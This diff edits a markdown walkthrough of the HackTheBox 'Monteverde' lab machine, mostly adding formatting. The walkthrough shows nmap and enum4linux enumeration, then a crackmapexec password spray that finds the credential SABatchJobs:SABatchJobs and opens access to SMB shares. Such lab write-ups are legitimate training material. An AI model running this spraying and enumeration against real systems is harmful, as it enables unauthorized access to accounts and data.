@@ -7,8 +7,8 @@ Monteverde,a Windows box created by HackTheBox user `egre55`, was an overall med
 ## Enumeration
 
 ### nmap scan
-
-# Nmap 7.80 scan initiated Tue June 2 14:11:44 2020 as: nmap -T4 -sC -sV -oN nmap/monteverde 10.10.10.172
+```
+### Nmap 7.80 scan initiated Tue June 2 14:11:44 2020 as: nmap -T4 -sC -sV -oN nmap/monteverde 10.10.10.172
 Nmap scan report for 10.10.10.172
 Host is up (0.21s latency).
 Not shown: 989 filtered ports
@@ -44,8 +44,8 @@ Host script results:
 |_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sat Jan 11 14:17:14 2020 -- 1 IP address (1 host up) scanned in 329.68 seconds
-
+### Nmap done at Sat Jan 11 14:17:14 2020 -- 1 IP address (1 host up) scanned in 329.68 seconds
+```
 we see all the ports are `Active Directory` and `SMB` related
 
 running `emum4linux` we get a list of usernames.
@@ -76,7 +76,7 @@ user:[roleary] rid:[0xa36]
 user:[smorgan] rid:[0xa37]
 
 using that we can create a `users.txt` as
-
+```
 Guest
 AAD_987d7f2f57d2
 mhope
@@ -87,12 +87,12 @@ svc-netapp
 dgalanos
 roleary
 smorgan
+```
+` crackmapexec smb 10.10.10.172 -u users.txt -p users.txt`
 
- crackmapexec smb 10.10.10.172 -u users.txt -p users.txt
+Trying the same username as password we get a successful credential as `SABatchJobs:SABatchJobs`
 
-Trying the same username as password we get a successful credential as SABatchJobs:SABatchJobs
+Trying that on `winrm` we get Invalid credential so lets try on `smb`, and Bingo
 
-Trying that on winrm we get Invalid credential so lets try on smb, and Bingo
-
-we can list and Read lot of shares checking //10.10.10.172/users$ share we see there is a `azure.xml` in mhope directory
+we can list and Read lot of shares checking //10.10.10.172/users$ share we see there is a `azure.xml` in `mhope` directory
 
